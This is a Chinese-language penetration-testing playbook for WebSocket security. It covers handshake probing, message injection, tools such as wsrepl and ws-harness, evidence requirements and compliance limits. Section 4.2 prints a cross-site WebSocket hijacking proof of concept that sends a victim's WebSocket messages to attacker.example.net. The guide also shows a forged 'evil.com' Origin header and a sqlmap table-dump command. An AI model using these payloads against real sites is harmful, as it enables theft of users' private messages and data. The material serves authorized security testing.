# WebSocket 安全测试（含跨站 WebSocket 劫持 CSWSH）

> 实时通讯（客服聊天、行情推送、协同编辑、站内信）走 WebSocket 时，攻击面从「HTTP 请求」变成「握手 + 长连接消息流」：握手可被 CSRF（CSWSH）、消息可注入/篡改、鉴权常在首条消息里做而后续消息不复查。WS 消息**不过浏览器同源策略的日常审视**，很多只在 HTTP 层做防护的系统在 WS 层裸奔。

**取材来源**：[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)（Web Sockets 章节，命令逐字摘录）；权威公开源 PortSwigger Web Security Academy / HackTricks。

---

## 1. 触发信号

- 页面 JS 出现 `new WebSocket(` / `io(`（Socket.IO） / 抓包见 `Upgrade: websocket` 握手与 `101 Switching Protocols`。
- 站内信/客服/通知/行情类功能；消息格式为 JSON。
- 握手 URL 形如 `wss://target.com/chat`、`ws://target.com/socket.io/?EIO=4&transport=websocket`。

> 路由规则：WS 消息里的注入（SQLi/XSS/越权 ID）**回到对应 playbook 打**——本文件解决「怎么把 WS 变成可测的 HTTP」与「CSWSH」两类 WS 特有问题。

## 2. 协议速览（判断测试入口）

握手是普通 HTTP/1.1 请求 `[PayloadsAllTheThings，逐字摘录]`：

```http
GET /chat HTTP/1.1
Host: example.com:80
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

服务端接受则回 `HTTP/1.1 101 Switching Protocols` + `Sec-WebSocket-Accept`。之后全双工消息流。Socket.IO 是 WS 之上的高层封装（握手带 `EIO`/`transport` 参数）。

**测试要点**：握手头可篡改（加 Origin / Cookie / 自定义头）→ CSWSH 与握手绕过的入口；消息流需专用工具（§5）。

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **消息面观察**：wsrepl 连上，记录正常消息流（鉴权消息长什么样、命令字有哪些）。
2. **消息注入**：把已知攻击面（消息里的 SQL/JSON 字段/对象 ID）过对应 playbook——借 ws-harness 把 WS 转成本地 HTTP 后用 sqlmap/ffuf 直接打。
3. **鉴权复查**：鉴权消息断开后继续发业务消息是否仍有效；跳过首条鉴权消息直接发业务消息。
4. **CSWSH**：检查握手是否校验 Origin——不校验则受害者浏览器可携 Cookie 从攻击者页面建立已认证 WS（§4.2）。
5. **Origin/鉴权绕过变体**：伪造 Origin 头直连握手，看是否放行。

## 4. Payload 区（每条标注出处）

### 4.1 握手操纵

改 `Origin` 头重放握手（CSWSH 前置判断）：`Origin: https://evil.com` 握手仍 101 = 不校验来源。

### 4.2 CSWSH（跨站 WebSocket 劫持）`[PayloadsAllTheThings，逐字摘录]`

原理：握手无 CSRF token/nonce 保护时，浏览器自动带 Cookie → 攻击者页面可用**受害者的已认证 WS**。托管在攻击者服务器上的利用代码，把 WS 收到的数据外带：

```html
<script>
  ws = new WebSocket('wss://vulnerable.example.com/messages');
  ws.onopen = function start(event) {
    ws.send("HELLO");
  }
  ws.onmessage = function handleReply(event) {
    fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});
  }
  ws.send("Some text sent to the server");
</script>
```

适配要点 `[PayloadsAllTheThings]`：目标用 `Sec-WebSocket-Protocol` 头时，须作为 `WebSocket` 构造函数的**第二个参数**传入（`new WebSocket(url, '协议名')`）才能带上该头。

## 5. 工具用法 `[PayloadsAllTheThings，逐字摘录]`

```bash
# wsrepl（doyensec）：交互式 REPL，兼容 curl 参数，RFC 6455 opcode 透明展示、自动重连
pip install wsrepl
wsrepl -u URL -P auth_plugin.py

# ws-harness.py（mfowl）：把 WS 端点转成本地 HTTP 服务，消息模板里用 [FUZZ] 标记 fuzz 位
python ws-harness.py -u "ws://dvws.local:8080/authenticate-user" -m ./message.txt
# message.txt: {"auth_user":"dGVzda==","auth_pass":"[FUZZ]"}
# 之后对本地服务用常规工具：
sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump
```

wsrepl 插件可在 WS 生命周期（init / on_message_sent / on_message_received）挂钩子做自动化（如自动取 token、自动解包消息）。

其他：PortSwigger `websocket-turbo-intruder`（Python 代码 fuzz WS）、Snyk `socketsleuth`（Burp 扩展增强 WS 测试）。

## 6. 证据要求

**CSWSH「已确认」必须满足**：① 握手带攻击者 Origin 仍返回 101（握手请求/响应原文）；② PoC 页面在**已登录受害浏览器**（自测账号）中建立 WS 并收到带敏感数据的消息流——抓外带请求或控制台截图；③ 对照：未登录/跨源被拒的基线。
**消息注入**：证据要求同对应注入类 playbook（经 ws-harness 转发后的完整请求/响应）。

**CVSS 参考**：CSWSH 读敏感消息流 `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N ≈ 7.1`；可发消息（冒充用户发言/触发动作）I:H 再升。

## 7. 合规边界 / 不要做的事

- **禁**：CSWSH PoC 让真实用户访问攻击页——用自己的两个测试账号，一个登录态浏览器加载 PoC 页即止。
- **禁**：WS 消息 flood（长连接压测=DoS）；fuzz 消息限速。
- **禁**：冒充他人身份发言/推送做实际业务影响，证明「能发」即停。
- **脱敏**：外带证据只保留自己测试账号的消息内容。
